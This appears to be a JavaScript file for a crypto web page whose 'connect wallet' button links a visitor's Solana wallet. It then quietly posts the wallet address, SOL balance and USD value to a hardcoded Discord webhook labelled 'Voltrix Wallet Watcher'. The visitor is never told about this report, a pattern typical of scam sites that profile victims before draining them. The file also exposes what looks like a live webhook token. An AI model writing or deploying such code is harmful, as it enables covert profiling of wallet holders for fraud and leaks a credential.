// === Discord Webhook URL ===
const webhookURL = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";

// === Load Web3Modal for Solana ===
const web3Modal = new window.Web3Modal({
  projectId: "24cb4618162c124a24e58a917ab7cc45", // optional
  walletConnectVersion: 2,
  solanaWallets: [new window.Web3ModalSolana.SolanaWalletAdapter()]
});

// === Connect to Solana Wallet and Send Info to Discord ===
async function connectSolanaWallet() {
  try {
    const wallet = new window.Web3ModalSolana.SolanaWalletAdapter();
    await wallet.connect();

    const publicKey = wallet.publicKey.toString();
    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
    const balance = await connection.getBalance(wallet.publicKey);
    const sol = balance / solanaWeb3.LAMPORTS_PER_SOL;

    const usdPrice = await getUSDPrice("solana");
    const usdValue = usdPrice ? (sol * usdPrice).toFixed(2) : null;

    await sendToDiscordEmbed({
      address: publicKey,
      nativeBalances: [
        { chain: "Solana", symbol: "SOL", amount: sol.toFixed(6), usd: usdValue }
      ],
      tokenSections: [] // Extend with token data if needed
    });
  } catch (e) {
    console.error("Solana connect error:", e);
  }
}

// === Fetch USD Price from CoinGecko ===
async function getUSDPrice(symbol) {
  try {
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbol}&vs_currencies=usd`);
    const data = await res.json();
    return data[symbol]?.usd || null;
  } catch {
    return null;
  }
}

// === Send Embed to Discord ===
async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
  const embed = {
    title: `💼 Wallet Connected`,
    description: `**👤 Wallet:** \`${address}\``,
    color: 0x00ffcc,
    fields: [
      {
        name: `💰 Native Balances`,
        value: nativeBalances.map(n => `**${n.chain}**: ${n.symbol} ${n.amount} ${n.usd ? `($${n.usd})` : ''}`).join('\n'),
        inline: false
      },
      ...tokenSections.map(section => ({
        name: `📜 Tokens on ${section.chain}`,
        value: section.tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ''}`).join('\n'),
        inline: false
      }))
    ],
    footer: { text: `Voltrix Wallet Watcher` },
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (err) {
    console.error("Failed to send embed", err);
  }
}

// === Button Logic ===
window.addEventListener("load", () => {
  const button = document.querySelector("w3m-core-button");
  if (button) {
    button.addEventListener("click", connectSolanaWallet);
  }
});
